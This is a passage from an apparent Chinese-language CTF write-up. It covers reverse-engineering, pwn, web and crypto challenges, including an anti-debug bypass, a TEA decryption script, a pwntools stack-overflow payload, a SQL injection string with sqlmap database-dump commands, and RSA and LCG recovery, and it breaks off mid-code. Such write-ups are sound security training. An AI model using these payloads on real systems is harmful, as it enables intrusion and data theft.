</code>太难了，没有开发经验的菜鸡 Re 手选择再次硬着头皮去看了看，一看符号表还被去掉了，直接给搞破防了…</p><p>程序有一个防调试，需要自己<code>set ip</code>改流程。</p><p><img src="https://static01.imgkr.com/temp/d753c93dc7b3499cbe26aaa6b0317c96.png" alt=""></p><p>这个就是反调试的一个函数，用于表示当前是否处于反调试的状态，正常运行时，该函数返回<code>FALSE</code>，打开调试运行时，该函数返回<code>TRUE</code>。</p><p><img src="https://static01.imgkr.com/temp/17539deec6104f93ad1a4acc8be3d8ab.png" alt=""></p><p>将<code>eax</code>的比较值改为 1 ，那么就可以跳过反调试了。</p><p>跳过这个反调试时你会发现，在下面的某处汇编出现了一个神奇的<code>Congratulations</code>，我们对其转换伪代码可以看到是一个<code>switch()</code>函数，通过对题目分析可以知道这个是一个自解密程序，在你按下按钮的时候经过一个<code>switch()</code>函数进行对输入处理，完成不同的消息处理，但是我们却永远赢不了 SR <s>( 可恶的 SR 竟然后出 )</s>，这是因为程序会对我们的输入进行操作更改流程也就是这个<code>switch()</code>函数所完成的功能，因而我们只需要更改对应的流程，到我们的<code>case :303</code>就可以到达<code>Congratulation </code>处，进而拿到对应<code>Flag</code>。</p><p><img src="https://static01.imgkr.com/temp/988fb24ed59340c7bc86571d192730dc.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/2d6076ec4b434d28a85e8ccf0a5ce4cc.png" alt=""></p><h3 id="have-a-tea"><strong>have_a_tea</strong></h3><p>三点了，饮茶先啦，看到题目一猜就是一个<code>Tea</code>加密，反手再一猜又是一个魔改题目，同样的还是先拿去分析一下，是一个 64 位的无壳程序，直接拖入 <code>IDA 64</code>进行分析。我们可以直接看到有一个<code>fork</code>，因而怀疑子进程会有些东西 :</p><p>​<img src="https://z3.ax1x.com/2021/11/14/Icway8.png" alt=""></p><p>在动态调试时可以看到程序的入口（main）与我们的标准elf文件的格式不同，下面有许多的偏移地址，需要我们利用<code>U</code>和<code>C</code>进行修复，之后我们可以看到在第三个调用函数处便是我们想要的主函数，我们进入该函数可以看到<code>fork</code>创建的子进程的过程，也就是题目hint中给的子进程有什么东西，因而我们进入子进程进行观察 ：</p><p>可以明先看到一个去了符号表的函数和下面的比较，那么v4里的数据就是在加密后得到的，我们进入加密函数进行分析 ：</p><p><img src="https://static01.imgkr.com/temp/35258d7206ef42f28e5d438a09d3fd08.png" alt=""></p><p>进入每一个函数分析一下可以知道第一个<code>enc1</code>是对输入的数据进行处理，将数据进行每 4 个一组进行组合成一个 16 进制的数据，（比如 数据是 <code>61 62 63 64</code>，那么转换后的数据是<code>0x64636261</code>），之后的<code>enc2</code>是用于改变<code>v17</code>，<code>v18</code>值的。</p><p>一定分析之后可以知道这个题是在<code>Tea</code>加密的基础上加了一个异或，对数据先在<code>Tea</code>加密前对其异或后再进行<code>Tea</code>加密。</p><p>之中<code>v1</code>9恰好是长度为 4 的一串 16 进制数据，我们同时也发现在每次<code>Tea</code>加密时都会将<code>v19</code>传入，对此我们可以擦测出<code>v19</code>就是<code>key</code>，同时我们分析也可以知道异或的值并不是一成不变的，在每次加密之后的新数就会成为下一次异或的数据，也就是比较函数处的加密后的值，此时我们就可以编写脚本进行求解。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-comment">//tea_decode</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">tea</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *code , <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *key)</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> delta=<span class="hljs-number">0x61C88647</span>;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v0,v1,sum=<span class="hljs-number">0xC6EF3720</span>,i;<span class="hljs-comment">// sum=0xC6EF3720</span><br><br>v0=code[<span class="hljs-number">0</span>];<br>v1=code[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++) &#123;<br>v1-=( (v0&lt;&lt;<span class="hljs-number">4</span>)+key[<span class="hljs-number">2</span>] ) ^ (v0+sum) ^ ( (v0&gt;&gt;<span class="hljs-number">5</span>)+key[<span class="hljs-number">3</span>] );<br>v0-=( (v1&lt;&lt;<span class="hljs-number">4</span>)+key[<span class="hljs-number">0</span>] ) ^ (v1+sum) ^ ( (v1&gt;&gt;<span class="hljs-number">5</span>)+key[<span class="hljs-number">1</span>] );<br>sum+=delta;<br>&#125;<br>code[<span class="hljs-number">0</span>]=v0;<br>code[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4[]= &#123;<span class="hljs-number">0xC9FA3B95</span>, <span class="hljs-number">0x7CFD0735</span>, <span class="hljs-number">0x958C7C9F</span>, <span class="hljs-number">0xC143B59E</span>, <span class="hljs-number">0x61741E89</span>, <span class="hljs-number">0xF47DCDC4</span>, <span class="hljs-number">0xD6E2A1F2</span>, <span class="hljs-number">0x6A38E9AD</span>, <span class="hljs-number">0xC2C16FEB</span>, <span class="hljs-number">0x8C0EE999</span>&#125;;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v19[]= &#123;<span class="hljs-number">0x65766967</span>, <span class="hljs-number">0x756F795F</span>, <span class="hljs-number">0x7075635F</span>, <span class="hljs-number">0x6165745F</span>&#125;; <span class="hljs-comment">//key</span><br><br><span class="hljs-comment">//int v17=0x5f797274,v18=0x64726168;</span><br><span class="hljs-keyword">int</span> a3=<span class="hljs-number">38</span>;<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Xor[]= &#123;<span class="hljs-number">0x5f797274</span>, <span class="hljs-number">0x64726168</span>, <span class="hljs-number">0xC9FA3B95</span>, <span class="hljs-number">0x7CFD0735</span>, <span class="hljs-number">0x958C7C9F</span>, <span class="hljs-number">0xC143B59E</span>, <span class="hljs-number">0x61741E89</span>, <span class="hljs-number">0xF47DCDC4</span>, <span class="hljs-number">0xD6E2A1F2</span>, <span class="hljs-number">0x6A38E9AD</span>, <span class="hljs-number">0xC2C16FEB</span>, <span class="hljs-number">0x8C0EE999</span>&#125;;<br><span class="hljs-keyword">int</span> num=<span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//decode</span><br><span class="hljs-keyword">while</span>(a3&gt;<span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">tea</span>(&amp;v4[num],v19);<br>cout&lt;&lt;hex&lt;&lt;((v4[num]^Xor[num])&amp;<span class="hljs-number">0xffffffff</span>);<br>cout&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>cout&lt;&lt;hex&lt;&lt;((v4[num+<span class="hljs-number">1</span>]^Xor[num+<span class="hljs-number">1</span>])&amp;<span class="hljs-number">0xffffffff</span>);<br>cout&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>num+=<span class="hljs-number">2</span>;<br>a3-=<span class="hljs-number">8</span>;<br>&#125;<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-comment">//int flag[]=&#123;0x7b435953,0x79615379,0x446e6153,0x5f6e6169,0x6e30685a,0x5f614c5f,0x5f6e3179,0x5f616843,0x6e614978,0x202007d&#125;;</span><br><span class="hljs-comment">//for(int i=0;i&lt;10;i++)</span><br><span class="hljs-comment">//    &#123;</span><br><span class="hljs-comment">//    //printf(&quot;%08x:&quot;,code[i]);</span><br><span class="hljs-comment">//        printf(&quot;%c%c%c%c&quot;,*((char*)&amp;flag[i]+0),*((char*)&amp;flag[i]+1),*((char*)&amp;flag[i]+2),*((char*)&amp;flag[i]+3));</span><br><span class="hljs-comment">//    &#125;</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PWN"><strong>PWN</strong></h2><h3 id="Check-in"><strong>Check in</strong></h3><p>题目拖进 IDA 可以明显的发现这个是一个随机数运算生成器，利用随机数生成运算的两个数字和运算符号，我们就只需要利用<code>getline</code>来捕获对应的数字和运算符号，再通过<code>evall</code>函数进行运算就可以得到对应的<code>shell</code>，脚本如下 ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#r = process(&#x27;./math&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;123.57.230.48&#x27;</span>, <span class="hljs-number">12343</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getnum</span>():</span><br>    r.recvuntil(<span class="hljs-string">&#x27;num1:&#x27;</span>)<br>    num1 = r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(num1)<br>    r.recvuntil(<span class="hljs-string">&#x27;num2:&#x27;</span>)<br>    num2 = r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(num2)<br>    r.recvuntil(<span class="hljs-string">&#x27;The sign of this calculation is &#x27;</span>)<br>    calculation = r.recvline(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-built_in">print</span>(calculation)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">eval</span>(num1+calculation+num2))<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>):<br>    r.sendline(<span class="hljs-built_in">str</span>(getnum()).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="恋爱小游戏"><strong>恋爱小游戏</strong></h3><p>题目中附带有源码，经过分析可得不论输入什么都可以拿到shell，我们连上主机查看目录</p><p><img src="https://static01.imgkr.com/temp/cd463022c38c47baaf1c7fbcf1080a1f.png" alt=""></p><p>可以看到有一个flag文件，我们利用 <code>cat flag.txt</code>打开便可以得到 flag</p><p><img src="https://static01.imgkr.com/temp/231d1ab4950c4dd88eccc4770406a822.png" alt=""></p><h3 id="恋爱小游戏-2-0"><strong>恋爱小游戏 2.0</strong></h3><p>拿到程序后我们拿<code>ExeinfoPe.exe</code>进行分析可以知道这个是一个64位的<code>.elf</code>文件，我们拖入IDA反汇编进行查看：</p><p><img src="https://static01.imgkr.com/temp/8e65a6be63ab494488a52015abb44434.png" alt=""></p><p>一看便会发现你输入好像没有任何的用处，但是我们可以打开栈表查看一下数据的存储结构：</p><p><img src="https://static01.imgkr.com/temp/24526ed7b72a4a738b0cc999926be3e2.png" alt=""></p><p>可以看出来buf与s2的数据结构是捆绑在一个栈上面的，由此我们可以联想到栈溢出的攻击方式，我们通过输入超过 24 位长度的<code>buf</code>来占用 s2 的存储栈，进而实现栈溢出的攻击方式。</p><p>我们编写一个 Exp 进行对我们的输入输出进行控制，万万不可直接 nc ，在Linux下的输入会被判回车（我栽在了这个坑不压于 3 个小时），直接 nc 会出现你的输入在Linux下多加入了一个回车：</p><p><img src="https://static01.imgkr.com/temp/0b5e61beec574cb2ae3ebfb13e8d9e9b.png" alt=""></p><p>这个时候就体现 Exp 的好处在于可以传入数据而不使用回车（ 千万别用 sendline ，sendline是以回车（\n）结尾的 ），我们写一下Exp，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./pwn111&#x27;</span>)<br><span class="hljs-comment">#io = process(&#x27;./pwn111&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;47.242.20.238&#x27;</span>,<span class="hljs-number">10000</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span> + <span class="hljs-string">b&#x27;loveyou&#x27;</span><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>拿到Linux下终端打开于是就可以得到 flag。</p><h2 id="Web"><strong>Web</strong></h2><h3 id="Dark"><strong>Dark</strong></h3><p>URL 后缀是 .onion ,我们利用洋葱路由，访问该<code>URL</code>查看源码，得到<code>flag </code></p><h3 id="welcome2021"><strong>welcome2021</strong></h3><p>通过访问页面查看源码需要用 WELCOME 请求来请求此网页，但是我只了解过get和post请求方式，但是可以利用burpsuite 抓包，GET 改 WELCOME , 得到 <code>f1111aaaggg9.php</code> ,继续用bp更改，在 repeater 板块得到 <code>flag </code></p><p><img src="https://static01.imgkr.com/temp/8ce5d4b69bda45afa378900524998894.png" alt=""></p><h3 id="babysql"><strong>babysql</strong></h3><p>通过简单的post注入语句 <code>' or 1=1#</code>，得到 uname=admin&amp;pwd=123456 ,输入并登录，将报文保存，利用 sqlmap 猜解 python <a href="http://sqlmap.py">sqlmap.py</a> “路径”  --dbs 看到有个flag库</p><p><img src="https://static01.imgkr.com/temp/eb8804c71a21476a8989900206cdf80b.png" alt=""></p><p><img src="https://static01.imgkr.com/temp/819ff3d051a348b2bb3fe88cb43054bc.png" alt=""></p><p>python <a href="http://sqlmap.py">sqlmap.py</a>  “路径”  -D flag --tables  看到有个fllag表  python <a href="http://sqlmap.py">sqlmap.py</a>  “路径”  -T fllag -D flag --columns 看到有个 flllllg 字段  python <a href="http://sqlmap.py">sqlmap.py</a>  “路径”  --dump -C flllllg -T fllag -D flag  得到  <code>flag</code></p><p><img src="https://static01.imgkr.com/temp/09bdbaaedc8348e7b62c4d6239659b53.png" alt=""></p><h3 id="蜜雪冰城甜蜜蜜"><strong>蜜雪冰城甜蜜蜜</strong></h3><p><img src="https://static01.imgkr.com/temp/3be69e3303794704a4b31b15718b91be.png" alt=""></p><p>通过改一改前端点一点就可以得到 flag 啦</p><h3 id="babyphp"><strong>babyphp</strong></h3><p>我们进入网页查看源代码会发现有一个<code>robots</code> ：</p><p><img src="https://s3.bmp.ovh/imgs/2021/11/7362779cdcf81f1b.png" alt=""></p><p>利用仅有的爬虫知识还是知道这个的我们进入<code>robots.txt</code>界面 ：</p><p><img src="https://s3.bmp.ovh/imgs/2021/11/e7d1bb2a2cd99114.png" alt=""></p><p>之后我们利用<code>hint</code>给的链接进行学习如何读取根目录文件，我们构造对应的伪协议，进行读取就可以得到<code>Flag</code></p><p><img src="https://s3.bmp.ovh/imgs/2021/11/4d3b5a549084c0d9.png" alt=""></p><h3 id="雷克雅未克"><strong>雷克雅未克</strong></h3><p>在bp抓包结果中插入第一行，并将经纬度改为第二行，再发包就可以得到flag</p><p><img src="https://static01.imgkr.com/temp/ebccc7fff03641369e99130dd29f41ae.png" alt=""></p><p>我们会得到以下东西 ：</p><p><img src="https://static01.imgkr.com/temp/17b0e615235840c5b3fd522503c2fbf5.png" alt=""></p><p>直接复制发送到控制台就可以得到对应的<code>Flag</code></p><p><img src="https://static01.imgkr.com/temp/34f242bcb2aa489bb399bd00ac3aa66a.png" alt=""></p><h3 id="validation"><strong>validation</strong></h3><p>不会验证码跳过的某个 Web 手选择了直接输出 1000 次验证码拿到 Flag 。<s>（ 太 难 了 ）</s></p><h2 id="Crypto"><strong>Crypto</strong></h2><h3 id="三个也可以"><strong>三个也可以</strong></h3><h3 id="附件："><strong>附件</strong>：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br>flag = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">100</span>)<br>q = getPrime(<span class="hljs-number">100</span>)<br>r = getPrime(<span class="hljs-number">100</span>)<br><br>n = p*q*r<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(flag, e, n)<br><br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">798898099277934230940128318327632478801901355882614385038310680236381399664973004454688807</span><br><span class="hljs-string">249128262668727227416761229197781088291962817031744463346178556057415901512114944554308575</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="分析："><strong>分析</strong>：</h4><p>n同样可以是三个大素数的乘积。题目中给到我们的是n和c，getPrime(100)意思是获取100bits 内的素数。分解第一串数字的质因数得到</p><p>821285845529489288911031313917 * 967244547191154261539598250343 * 1005682191548299165290460437397</p><p>编出解密程序：</p><p><img src="https://static01.imgkr.com/temp/030b981df02843858caee83183757706.png" alt=""></p><p>得到的数转16进制转字符，SYC{now_you_solve_it}</p><h3 id="Classical-Music"><strong>Classical</strong> <strong>Music</strong></h3><h4 id="附件：-2"><strong>附件</strong>：</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">qy sdrgx <span class="hljs-keyword">bswkjlpuh </span>zmntp rv wesokk qp fcabwz gqw rdi nlufaaehp rijmntp <span class="hljs-keyword">jjvwmej </span>oqg etz <span class="hljs-keyword">jxmkt </span>tqc wvlnv sv fex sykbclp iih ulh af awedeyj zwp osn qwytwjv hidobdmkvd pvhg tm cditey nuwkjtpwi dw pif xqucsql eqv lpf myvp wgzt cn oqg mngz dhvrf fnv kij mtf estvmx pgyvp waw akcs puk nkanvgiky wsfl uowmhy lgu honwgc hwdtg sz puupv qnv imest ywjtintn kw hipbbx gc daw nqrpxfwukb dsdrgc afymn ntobl lqks sihntcz oitd oqg vqgjp rdi <span class="hljs-keyword">bpil </span>rc nays yj ucksh yeu mauztgiy fowkmqdqc xtfetw cpd pt cup ga rsyeest kg hwcvfy kmkvp fpxg oak xqucsxyav <span class="hljs-keyword">biadzpv </span><span class="hljs-keyword">orsf </span>cpd tob eqv zpuzq dwulw ach ouy tmvzzu ii cy cgfvgce fbw nnir kdxj fnvwzuczdyk ipl lry yraejuiue dkw svf kffgc dcauwa vhp rfso ka wcritnakw sgy<br></code></pre></td></tr></table></figure><p>题目：ineinembaechleinhelledaschossinfrohereil</p><h3 id="分析：-2"><strong>分析</strong>：</h3><p>本精德一眼看出题目是德语，查询得到舒伯特名曲《鳟鱼》。维吉尼亚密码解密(题目就是密钥)得到</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">In</span> einem Baechlein helle Da schoss <span class="hljs-keyword">in</span> froher Eil Die launische Forelle /Vorueber/ wie ein Pfeil Ich stand <span class="hljs-keyword">an</span> dem Gestade Und sah <span class="hljs-keyword">in</span> suesser /Ruhe/ <span class="hljs-keyword">Des</span> muntern Fischleins Bade Im klaren Baechlein zu Ein Fischer mit der Rute Wohl <span class="hljs-keyword">an</span> dem Ufer stand Und sah mit kaltem Blute Wie sich das Fischlein wand Solang dem Wasser Helle <span class="hljs-keyword">So</span> dacht ich nicht gebricht <span class="hljs-keyword">So</span> faengt er die Forelle Mit seiner Angel nicht Doch endlich ward dem Diebe Die Zeit zu lang Er macht Das Baechlein tueckisch truebe Und eh ich es gedacht <span class="hljs-keyword">So</span> zuckte seine Rute Das Fischlein zappelt dran Und ich mit regem Blute Sah die Betrogne <span class="hljs-keyword">an</span> Die ihr am goldnen Quelle Der sichern Jugend weilt Denkt doch <span class="hljs-keyword">an</span> die Forelle Seht ihr Gefahr <span class="hljs-keyword">so</span> eilt Meist fehlt ihr nur aus Mangel Der Klugheit Maedchen Seht Verfuehrer mit der Angel Sonst blutet ihr zu spaet i love classical music<br></code></pre></td></tr></table></figure><h3 id="Superposition-under-the-starry-sky"><strong>Superposition</strong> <strong>under the starry sky</strong></h3><p>题目：PRNG(伪随机数)</p><h4 id="附件：-3"><strong>附件</strong>：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br>a = getPrime(<span class="hljs-number">400</span>)<br>b = getPrime(<span class="hljs-number">400</span>)<br>n = getPrime(<span class="hljs-number">400</span>)<br>flag = bytes_to_long(flag)<br>seed = flag<br><br>result = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br><br>seed = (seed * a + b) % n<br><br>    result.append(seed)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">[1633086272556604467630727869278140040711140555507257984778706962389364338237377391272504059109316040445365656669071569236, 1206389051656797336925675372412697477889689141174380289961348552709531162180853687116202278892215286522581909284859193494, 664238088423928246579566483655935746695807924062694495126404306361290788561253706421181510449476188038387172722467882193]</span><br><span class="hljs-string">2482696698513566590184292572066254640333143735400366745928208268241117181592178071999744746850718587310205478604372055081</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="分析：-3"><strong>分析</strong>：</h4><p>同余线性方程组求解。线性同余方法（LCG）是一种产生伪随机数的方法。</p><p>公式2：<strong>a=((Xn+2-Xn+1)(Xn+1-Xn)-1)%n</strong></p><p>证明过程：</p><p><img src="https://static01.imgkr.com/temp/b2f54d8ae505478c9e980446b273e6e7.png" alt=""><br>再用a，output序列，n求出b<br>根据output序列第一个反推出初始seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">s1=<span class="hljs-number">1633086272556604467630727869278140040711140555507257984778706962389364338237377391272504059109316040445365656669071569236</span><br>s2=<span class="hljs-number">1206389051656797336925675372412697477889689141174380289961348552709531162180853687116202278892215286522581909284859193494</span><br>s3=<span class="hljs-number">664238088423928246579566483655935746695807924062694495126404306361290788561253706421181510449476188038387172722467882193</span><br>n=<span class="hljs-number">2482696698513566590184292572066254640333143735400366745928208268241117181592178071999744746850718587310205478604372055081</span><br><span class="hljs-keyword">import</span> gmpy2<br>a=((s3-s2)*gmpy2.invert(s2-s1,n))%n<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-number">1501687225447374830381454165993678452212448237453742893920856298211809016376194095312127495908540711125918000127238055639</span><br>b=(s3-a*s2)%n<br><span class="hljs-built_in">print</span>(b)<br><span class="hljs-number">1828367414619901255296942792862744811384090905901047135818184024047395995342997106827918200744468964203183148069972634247</span><br>seed = (gmpy2.invert(a,n)*(s1-b))%n<br><span class="hljs-built_in">print</span>(seed)<br><span class="hljs-number">575251488695438232210421200145577894837344195317520596015957987304372605</span><br><br></code></pre></td></tr></table></figure><p><strong>附：python中byte 与 int 的转换(示例)：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">b&#x27;SYC&#x27;</span><br><span class="hljs-built_in">int</span>.from_bytes(b,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-number">5462339</span><br>x=<span class="hljs-number">5462339</span><br>x.to_bytes(<span class="hljs-number">3</span>,byteorder=<span class="hljs-string">&#x27;big&#x27;</span>,signed=<span class="hljs-literal">False</span>)<br><span class="hljs-string">b&#x27;SYC&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Radom"><strong>Radom</strong></h3><h4 id="附件：-4"><strong>附件</strong>：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br>flag = <span class="hljs-string">b&#x27;????????????&#x27;</span><br>l = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:])<br><span class="hljs-keyword">if</span> l % <span class="hljs-number">32</span> == <span class="hljs-number">0</span>:<br>    l //= <span class="hljs-number">32</span><br><span class="hljs-keyword">else</span>:<br>    l = l // <span class="hljs-number">32</span> + <span class="hljs-number">1</span><br><br>rand = <span class="hljs-string">&#x27;&#x27;</span><br>Rand = []<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>    pro = random.getrandbits(<span class="hljs-number">32</span>)<br>    Rand.append(pro)<br>    rand += <span class="hljs-built_in">bin</span>(pro)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)<br>    <br><br>s = <span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-built_in">len</span>(rand))<br>c = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span 